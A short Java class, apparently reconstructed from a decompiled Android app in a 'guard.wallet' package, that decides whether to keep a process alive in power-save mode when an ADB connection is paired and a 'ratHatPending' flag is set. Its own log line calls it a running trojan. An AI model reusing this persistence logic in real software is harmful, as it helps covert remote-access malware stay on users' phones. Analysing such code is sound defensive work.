package com.guard.wallet.power;

import android.util.Log;
import com.guard.wallet.adb.AdbConnectionManager;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * vendor w/a.java -> PowerSaveChecker
 *
 * 检查省电模式下是否需要保活。
 * 当设备进入省电模式且 ADB 连接处于活跃状态时返回 true，
 * 指示系统应启用省电保活策略。
 */
public abstract class PowerSaveChecker {
    /** 省电标志 — 由 PowerBroadcastReceiver / BatteryLevelReceiver 设置 */
    public static final AtomicBoolean inPowerSaveMode = new AtomicBoolean(false);

    /**
     * 检查是否需要保活。
     * 条件: 省电标志为 true && ADB 连接管理器存在且已配对、D()、ratHatPending。
     */
    public static boolean shouldKeepAlive() {
        if (inPowerSaveMode.get() && AdbConnectionManager.getInstance() != null && AdbConnectionManager.getInstance().isPaired() && AdbConnectionManager.getInstance().D() && AdbConnectionManager.getInstance().ratHatPending.get()) {
            Log.d("PowerSaveManager", "木马正在运行,进入省电模式保活策略");
            return true;
        }
        return false;
    }
}
